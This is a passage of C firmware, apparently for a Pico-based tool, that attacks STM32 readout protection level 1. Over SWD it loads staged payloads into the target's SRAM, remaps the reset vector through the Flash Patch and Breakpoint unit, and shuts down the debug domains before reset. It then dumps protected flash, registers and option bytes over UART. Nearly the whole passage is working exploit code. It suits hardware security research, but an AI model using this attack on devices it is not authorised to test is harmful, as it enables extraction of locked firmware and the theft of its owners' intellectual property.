                goto halt_reset;
            }
        }
        line_buf[line_pos++] = uart_getc(TARGET_UART_ID);
        rx_total++;

        if (line_pos == 16 || rx_total == dump_bytes) {
            uint32_t line_addr = 0x08000000 + rx_total - line_pos;
            uart_cli_printf("0x%08lX:", line_addr);
            for (uint32_t j = 0; j < line_pos; j++)
                uart_cli_printf(" %02X", line_buf[j]);
            for (uint32_t j = line_pos; j < 16; j++)
                uart_cli_send("   ");
            uart_cli_send("  ");
            for (uint32_t j = 0; j < line_pos; j++) {
                char c = line_buf[j];
                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            uart_cli_send("\r\n");
            line_pos = 0;
        }
    }

    uart_cli_printf("\r\nDump complete: %lu bytes received\r\n", rx_total);

halt_reset:
    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

halt_cleanup:
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

void target_power_literal(void) {
    extern bool swd_connect_under_reset(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_literal_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3B4 + 1;

    uart_cli_printf("RDP1 LITERAL test: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_literal_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    // === Step 1: Connect under reset ===
    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    // === Step 2: Upload literal payload to SRAM ===
    uart_cli_send("[2] Uploading literal payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_literal_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_literal_payload, sizeof(rdp_literal_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // === Step 3: Configure FPB via SWD ===
    uart_cli_send("[3] Configuring FPB via SWD...\r\n");

    // Write stage 2 thumb address to remap[0]
    uint32_t remap_val = stage2_thumb_addr;
    if (swd_write_mem(sram_base + 0x20, &remap_val, 1) != 1) {
        uart_cli_send("ERROR: Failed to write remap table\r\n");
        swd_deinit();
        return;
    }

    // FP_CTRL = ENABLE + KEY
    uint32_t fp_ctrl = 0x03;
    swd_write_mem(0xE0002000, &fp_ctrl, 1);

    // FP_REMAP = 0x20000020
    uint32_t fp_remap = 0x20000020;
    swd_write_mem(0xE0002004, &fp_remap, 1);

    // FP_COMP0: reset vector redirect (addr 0x04, REPLACE=00, ENABLE)
    uint32_t fp_comp0 = 0x05;
    swd_write_mem(0xE0002008, &fp_comp0, 1);

    // Verify FPB config
    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002004, &verify_val, 1);
    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002008, &verify_val, 1);
    uart_cli_printf("    FP_COMP0: 0x%08lX\r\n", verify_val);
    swd_read_mem(sram_base + 0x20, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);

    // Clear VC_CORERESET
    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    // === Step 4: Set PC to stage 1, 3-step detach ===
    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);

    // Init UART before resume
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // BMP cortexm_detach: 3-step DHCSR
    uint32_t dhcsr_val;
    dhcsr_val = 0xA05F0003;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0001;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0000;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    swd_deinit();

    sleep_ms(200);

    // Read stage 1 report
    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    // === Step 5: Pulse nRST — FPB redirects to stage 2 ===
    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");

    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    uint8_t reset_pin = 15;
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // === Step 6: Receive literal test results ===
    uart_cli_send("[6] Receiving literal comparator test results...\r\n");

    #define LIT_TIMEOUT_US 5000000
    #define LIT_BYTE_TIMEOUT_US 500000

    // Scan for "LIT1" header
    uint8_t hdr_state = 0;
    const char *hdr_str = "LIT1";
    uint64_t rx_start = time_us_64();
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'L') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > LIT_TIMEOUT_US) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"LIT1\" header not received\r\n");
        goto lit_cleanup;
    }
    uart_cli_send("    Header: LIT1\r\n");

    // Helper: read 4 bytes LE into uint32_t
    #define READ_WORD(dest) do { \
        uint8_t _b[4]; bool _ok = true; \
        for (int _i = 0; _i < 4; _i++) { \
            uint64_t _t = time_us_64(); \
            while (!uart_is_readable(TARGET_UART_ID)) { \
                if (time_us_64() - _t > LIT_BYTE_TIMEOUT_US) { _ok = false; break; } \
            } \
            if (!_ok) break; \
            _b[_i] = uart_getc(TARGET_UART_ID); \
        } \
        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); goto lit_cleanup; } \
        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
    } while(0)

    uint32_t val;

    // DHCSR
    READ_WORD(val);
    uart_cli_printf("    DHCSR:    0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);

    // FP_CTRL
    READ_WORD(val);
    uart_cli_printf("    FP_CTRL:  0x%08lX  ENABLE=%lu NUM_CODE=%lu NUM_LIT=%lu\r\n",
                    val, val & 1, (val >> 4) & 0xF, (val >> 8) & 0xF);

    // FP_COMP6
    READ_WORD(val);
    uart_cli_printf("    FP_COMP6: 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    // FP_COMP7
    READ_WORD(val);
    uart_cli_printf("    FP_COMP7: 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    // Test read 0: 0x08000000 (COMP6 should intercept)
    READ_WORD(val);
    uart_cli_printf("    Read 0x08000000: 0x%08lX", val);
    if (val == 0xDEAD0006)
        uart_cli_send("  << SENTINEL (literal comp intercepted!)\r\n");
    else
        uart_cli_printf("  << %s\r\n", val == 0 ? "ZERO" : "UNKNOWN");

    // Test read 1: 0x08000004 (COMP7 should intercept)
    READ_WORD(val);
    uart_cli_printf("    Read 0x08000004: 0x%08lX", val);
    if (val == 0xDEAD0007)
        uart_cli_send("  << SENTINEL (literal comp intercepted!)\r\n");
    else
        uart_cli_printf("  << %s\r\n", val == 0 ? "ZERO" : "UNKNOWN");

    // Test read 2: 0x08000008 (no comp — should fault)
    READ_WORD(val);
    uart_cli_printf("    Read 0x08000008: 0x%08lX\r\n", val);

    // Check for "DONE" or "FLT!"
    {
        char trail[4] = {0};
        bool got_trail = true;
        for (int i = 0; i < 4; i++) {
            uint64_t t0 = time_us_64();
            while (!uart_is_readable(TARGET_UART_ID)) {
                if (time_us_64() - t0 > LIT_BYTE_TIMEOUT_US) { got_trail = false; break; }
            }
            if (!got_trail) break;
            trail[i] = uart_getc(TARGET_UART_ID);
        }
        if (got_trail) {
            if (memcmp(trail, "DONE", 4) == 0)
                uart_cli_send("\r\n    Result: ALL READS SUCCEEDED (DONE)\r\n");
            else if (memcmp(trail, "FLT!", 4) == 0) {
                uart_cli_send("\r\n    Result: HARDFAULT (FLT!)\r\n");
                // Read stacked PC (4 bytes)
                uint32_t fault_pc;
                READ_WORD(fault_pc);
                uart_cli_printf("    Fault PC: 0x%08lX\r\n", fault_pc);
            } else {
                uart_cli_printf("\r\n    Trailing: %02X %02X %02X %02X\r\n",
                               trail[0], trail[1], trail[2], trail[3]);
            }
        } else {
            uart_cli_send("\r\n    (no trailing marker received)\r\n");
        }
    }

    #undef READ_WORD

    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

lit_cleanup:
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

void target_power_regdump(void) {
    extern bool swd_connect_under_reset(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_regdump_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3D4 + 1;

    uart_cli_printf("RDP1 REGDUMP: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_regdump_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    // === Step 1: Connect under reset ===
    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    // === Step 2: Upload payload ===
    uart_cli_send("[2] Uploading regdump payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_regdump_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_regdump_payload, sizeof(rdp_regdump_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // === Step 3: Configure FPB ===
    uart_cli_send("[3] Configuring FPB via SWD...\r\n");

    uint32_t remap_val = stage2_thumb_addr;
    swd_write_mem(sram_base + 0x20, &remap_val, 1);

    uint32_t fp_ctrl = 0x03;
    swd_write_mem(0xE0002000, &fp_ctrl, 1);
    uint32_t fp_remap = 0x20000020;
    swd_write_mem(0xE0002004, &fp_remap, 1);
    uint32_t fp_comp0 = 0x05;
    swd_write_mem(0xE0002008, &fp_comp0, 1);

    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
    swd_read_mem(sram_base + 0x20, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);

    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    // === Step 4: Set PC to stage 1, 3-step detach ===
    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);

    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    uint32_t dhcsr_val;
    dhcsr_val = 0xA05F0003;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0001;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0000;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);

    // DP power-down — kill debug+system domains, hold down before nRST
    // Don't read back (that would re-power it via SWD handshake)
    extern bool swd_write_dp(uint8_t addr, uint32_t value);
    extern bool swd_read_dp(uint8_t addr, uint32_t *value);
    uint32_t dp_ctrl;
    if (swd_read_dp(0x4, &dp_ctrl)) {
        uart_cli_printf("    DP CTRL/STAT: 0x%08lX\r\n", dp_ctrl);
        uint32_t dp_off = dp_ctrl & ~((1u << 28) | (1u << 30));
        swd_write_dp(0x4, dp_off);
        uart_cli_send("    Debug domains powered down, holding 2s...\r\n");
    }

    swd_deinit();

    sleep_ms(2000);

    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    // === Step 5: Pulse nRST (flash boot with FPB redirect) ===
    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");

    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    uint8_t reset_pin = 15;
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // === Step 6: Receive register dump ===
    uart_cli_send("[6] Receiving register dump...\r\n");

    #define RD_TIMEOUT_US 5000000
    #define RD_BYTE_TIMEOUT_US 500000

    // Scan for "REG1" header
    uint8_t hdr_state = 0;
    const char *hdr_str = "REG1";
    uint64_t rx_start = time_us_64();
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > RD_TIMEOUT_US) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"REG1\" header not received\r\n");
        goto rd_cleanup;
    }
    uart_cli_send("    Header: REG1\r\n");

    // Read 4 bytes LE into uint32_t
    #define RD_READ_WORD(dest) do { \
        uint8_t _b[4]; bool _ok = true; \
        for (int _i = 0; _i < 4; _i++) { \
            uint64_t _t = time_us_64(); \
            while (!uart_is_readable(TARGET_UART_ID)) { \
                if (time_us_64() - _t > RD_BYTE_TIMEOUT_US) { _ok = false; break; } \
            } \
            if (!_ok) break; \
            _b[_i] = uart_getc(TARGET_UART_ID); \
        } \
        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); goto rd_cleanup; } \
        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
    } while(0)

    uint32_t val;

    uart_cli_send("\r\n=== REGISTER DUMP ===\r\n");

    // 0: DHCSR
    RD_READ_WORD(val);
    uart_cli_printf("  DHCSR        (0xE000EDF0) = 0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);

    // 1: DEMCR
    RD_READ_WORD(val);
    uart_cli_printf("  DEMCR        (0xE000EDFC) = 0x%08lX  VC_CORERESET=%lu TRCENA=%lu\r\n",
                    val, val & 1, (val >> 24) & 1);

    // 2: DBGMCU_IDCODE
    RD_READ_WORD(val);
    uart_cli_printf("  DBGMCU_IDCODE(0xE0042000) = 0x%08lX  DEV_ID=0x%03lX REV=0x%04lX\r\n",
                    val, val & 0xFFF, (val >> 16) & 0xFFFF);

    // 3: DBGMCU_CR
    RD_READ_WORD(val);
    uart_cli_printf("  DBGMCU_CR    (0xE0042004) = 0x%08lX", val);
    if (val & 1) uart_cli_send(" DBG_SLEEP");
    if (val & 2) uart_cli_send(" DBG_STOP");
    if (val & 4) uart_cli_send(" DBG_STANDBY");
    uart_cli_send("\r\n");

    // 4: FLASH_ACR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_ACR    (0x40022000) = 0x%08lX  LATENCY=%lu PRFTBE=%lu PRFTBS=%lu\r\n",
                    val, val & 7, (val >> 4) & 1, (val >> 5) & 1);

    // 5: FLASH_SR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_SR     (0x4002200C) = 0x%08lX  BSY=%lu PGERR=%lu WRPRTERR=%lu EOP=%lu\r\n",
                    val, val & 1, (val >> 2) & 1, (val >> 4) & 1, (val >> 5) & 1);

    // 6: FLASH_CR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_CR     (0x40022010) = 0x%08lX  LOCK=%lu", val, (val >> 7) & 1);
    if (val & 1) uart_cli_send(" PG");
    if (val & 2) uart_cli_send(" PER");
    if (val & 4) uart_cli_send(" MER");
    if (val & 0x10) uart_cli_send(" OPTPG");
    if (val & 0x20) uart_cli_send(" OPTER");
    uart_cli_send("\r\n");

    // 7: FLASH_OBR — THE KEY ONE
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_OBR    (0x4002201C) = 0x%08lX  *** RDPRT=%lu ***", val, (val >> 1) & 1);
    if (val & 1) uart_cli_send(" OPTERR");
    uart_cli_printf("  Data0=0x%02lX Data1=0x%02lX\r\n", (val >> 10) & 0xFF, (val >> 18) & 0xFF);

    // 8: FLASH_WRPR
    RD_READ_WORD(val);
    uart_cli_printf("  FLASH_WRPR   (0x40022020) = 0x%08lX\r\n", val);

    // 9: FP_CTRL
    RD_READ_WORD(val);
    uart_cli_printf("  FP_CTRL      (0xE0002000) = 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    // 10: DWT_CTRL
    RD_READ_WORD(val);
    uart_cli_printf("  DWT_CTRL     (0xE0001000) = 0x%08lX\r\n", val);

    // 11: SCB_AIRCR
    RD_READ_WORD(val);
    uart_cli_printf("  SCB_AIRCR    (0xE000ED0C) = 0x%08lX  VECTKEY=0x%03lX\r\n",
                    val, (val >> 16) & 0xFFFF);

    // 12: SCB_SCR
    RD_READ_WORD(val);
    uart_cli_printf("  SCB_SCR      (0xE000ED10) = 0x%08lX\r\n", val);

    // 13: AFIO_MAPR
    RD_READ_WORD(val);
    uart_cli_printf("  AFIO_MAPR    (0x40010004) = 0x%08lX  SWJ_CFG=%lu\r\n",
                    val, (val >> 24) & 7);

    // 14: RCC_CR
    RD_READ_WORD(val);
    uart_cli_printf("  RCC_CR       (0x40021000) = 0x%08lX  HSION=%lu HSIRDY=%lu HSEON=%lu HSERDY=%lu PLLON=%lu\r\n",
                    val, val & 1, (val >> 1) & 1, (val >> 16) & 1, (val >> 17) & 1, (val >> 24) & 1);

    // 15: RCC_CSR
    RD_READ_WORD(val);
    uart_cli_printf("  RCC_CSR      (0x40021024) = 0x%08lX ", val);
    if (val & (1 << 26)) uart_cli_send("PIN_RST ");
    if (val & (1 << 27)) uart_cli_send("POR ");
    if (val & (1 << 28)) uart_cli_send("SW_RST ");
    if (val & (1 << 29)) uart_cli_send("IWDG ");
    if (val & (1 << 30)) uart_cli_send("WWDG ");
    if (val & (1 << 31)) uart_cli_send("LPWR ");
    uart_cli_send("\r\n");

    // 16: CPUID
    RD_READ_WORD(val);
    uart_cli_printf("  CPUID        (0xE000ED00) = 0x%08lX", val);
    uint8_t impl = (val >> 24) & 0xFF;
    uint16_t partno = (val >> 4) & 0xFFF;
    if (impl == 0x41 && partno == 0xC23)
        uart_cli_printf("  Cortex-M3 r%lup%lu", (val >> 20) & 0xF, val & 0xF);
    uart_cli_send("\r\n");

    uart_cli_send("=====================\r\n");

    // === Flash read tests ===
    uart_cli_send("\r\n=== FLASH READ TESTS ===\r\n");
    struct {
        const char *name;
        uint32_t addr;
    } flash_tests[] = {
        {"Flash base     ", 0x08000000},
        {"Reset vector   ", 0x08000004},
        {"Option bytes   ", 0x1FFFF800},
        {"OB USER/nUSER  ", 0x1FFFF802},
        {"Flash size reg ", 0x1FFFF7E0},
    };

    for (int t = 0; t < 5; t++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > RD_BYTE_TIMEOUT_US) {
                uart_cli_printf("  %s (0x%08lX): TIMEOUT\r\n", flash_tests[t].name, flash_tests[t].addr);
                goto rd_done;
            }
        }
        uint8_t status = uart_getc(TARGET_UART_ID);
        uint32_t data;
        RD_READ_WORD(data);

        if (status == 'O') {
            uart_cli_printf("  %s (0x%08lX): OK    0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else if (status == 'F') {
            uart_cli_printf("  %s (0x%08lX): FAULT (PC=0x%08lX)\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else {
            uart_cli_printf("  %s (0x%08lX): ??? status=0x%02X data=0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, status, data);
        }
    }

rd_done:
    // Check for "DONE"
    {
        char done_buf[4] = {0};
        bool got_done = true;
        for (int i = 0; i < 4; i++) {
            uint64_t t0 = time_us_64();
            while (!uart_is_readable(TARGET_UART_ID)) {
                if (time_us_64() - t0 > RD_BYTE_TIMEOUT_US) { got_done = false; break; }
            }
            if (!got_done) break;
            done_buf[i] = uart_getc(TARGET_UART_ID);
        }
        if (got_done && memcmp(done_buf, "DONE", 4) == 0)
            uart_cli_send("\r\n=== COMPLETE ===\r\n");
        else
            uart_cli_send("\r\n=== INCOMPLETE ===\r\n");
    }

    #undef RD_READ_WORD

    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

rd_cleanup:
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

// Receive and display regdump results from UART (shared by halt and glitch variants)
static bool receive_regdump_results(void) {
    #define RDR_TIMEOUT_US 5000000
    #define RDR_BYTE_TIMEOUT_US 500000

    // Scan for "REG1" header
    uint8_t hdr_state = 0;
    const char *hdr_str = "REG1";
    uint64_t rx_start = time_us_64();
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > RDR_TIMEOUT_US) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"REG1\" header not received\r\n");
        return false;
    }
    uart_cli_send("    Header: REG1\r\n");

    // Read 4 bytes LE into uint32_t
    #define RDR_READ_WORD(dest) do { \
        uint8_t _b[4]; bool _ok = true; \
        for (int _i = 0; _i < 4; _i++) { \
            uint64_t _t = time_us_64(); \
            while (!uart_is_readable(TARGET_UART_ID)) { \
                if (time_us_64() - _t > RDR_BYTE_TIMEOUT_US) { _ok = false; break; } \
            } \
            if (!_ok) break; \
            _b[_i] = uart_getc(TARGET_UART_ID); \
        } \
        if (!_ok) { uart_cli_send("TIMEOUT\r\n"); return false; } \
        (dest) = _b[0] | (_b[1] << 8) | (_b[2] << 16) | (_b[3] << 24); \
    } while(0)

    uint32_t val;

    uart_cli_send("\r\n=== REGISTER DUMP ===\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  DHCSR        (0xE000EDF0) = 0x%08lX  C_DEBUGEN=%lu\r\n", val, val & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  DEMCR        (0xE000EDFC) = 0x%08lX  VC_CORERESET=%lu TRCENA=%lu\r\n",
                    val, val & 1, (val >> 24) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  DBGMCU_IDCODE(0xE0042000) = 0x%08lX  DEV_ID=0x%03lX REV=0x%04lX\r\n",
                    val, val & 0xFFF, (val >> 16) & 0xFFFF);

    RDR_READ_WORD(val);
    uart_cli_printf("  DBGMCU_CR    (0xE0042004) = 0x%08lX", val);
    if (val & 1) uart_cli_send(" DBG_SLEEP");
    if (val & 2) uart_cli_send(" DBG_STOP");
    if (val & 4) uart_cli_send(" DBG_STANDBY");
    uart_cli_send("\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_ACR    (0x40022000) = 0x%08lX  LATENCY=%lu PRFTBE=%lu PRFTBS=%lu\r\n",
                    val, val & 7, (val >> 4) & 1, (val >> 5) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_SR     (0x4002200C) = 0x%08lX  BSY=%lu PGERR=%lu WRPRTERR=%lu EOP=%lu\r\n",
                    val, val & 1, (val >> 2) & 1, (val >> 4) & 1, (val >> 5) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_CR     (0x40022010) = 0x%08lX  LOCK=%lu", val, (val >> 7) & 1);
    if (val & 1) uart_cli_send(" PG");
    if (val & 2) uart_cli_send(" PER");
    if (val & 4) uart_cli_send(" MER");
    if (val & 0x10) uart_cli_send(" OPTPG");
    if (val & 0x20) uart_cli_send(" OPTER");
    uart_cli_send("\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_OBR    (0x4002201C) = 0x%08lX  *** RDPRT=%lu ***", val, (val >> 1) & 1);
    if (val & 1) uart_cli_send(" OPTERR");
    uart_cli_printf("  Data0=0x%02lX Data1=0x%02lX\r\n", (val >> 10) & 0xFF, (val >> 18) & 0xFF);

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_WRPR   (0x40022020) = 0x%08lX\r\n", val);

    RDR_READ_WORD(val);
    uart_cli_printf("  FP_CTRL      (0xE0002000) = 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  DWT_CTRL     (0xE0001000) = 0x%08lX\r\n", val);

    RDR_READ_WORD(val);
    uart_cli_printf("  SCB_AIRCR    (0xE000ED0C) = 0x%08lX  VECTKEY=0x%03lX\r\n",
                    val, (val >> 16) & 0xFFFF);

    RDR_READ_WORD(val);
    uart_cli_printf("  SCB_SCR      (0xE000ED10) = 0x%08lX\r\n", val);

    RDR_READ_WORD(val);
    uart_cli_printf("  AFIO_MAPR    (0x40010004) = 0x%08lX  SWJ_CFG=%lu\r\n",
                    val, (val >> 24) & 7);

    RDR_READ_WORD(val);
    uart_cli_printf("  RCC_CR       (0x40021000) = 0x%08lX  HSION=%lu HSIRDY=%lu HSEON=%lu HSERDY=%lu PLLON=%lu\r\n",
                    val, val & 1, (val >> 1) & 1, (val >> 16) & 1, (val >> 17) & 1, (val >> 24) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  RCC_CSR      (0x40021024) = 0x%08lX ", val);
    if (val & (1 << 26)) uart_cli_send("PIN_RST ");
    if (val & (1 << 27)) uart_cli_send("POR ");
    if (val & (1 << 28)) uart_cli_send("SW_RST ");
    if (val & (1 << 29)) uart_cli_send("IWDG ");
    if (val & (1 << 30)) uart_cli_send("WWDG ");
    if (val & (1 << 31)) uart_cli_send("LPWR ");
    uart_cli_send("\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  CPUID        (0xE000ED00) = 0x%08lX", val);
    uint8_t impl = (val >> 24) & 0xFF;
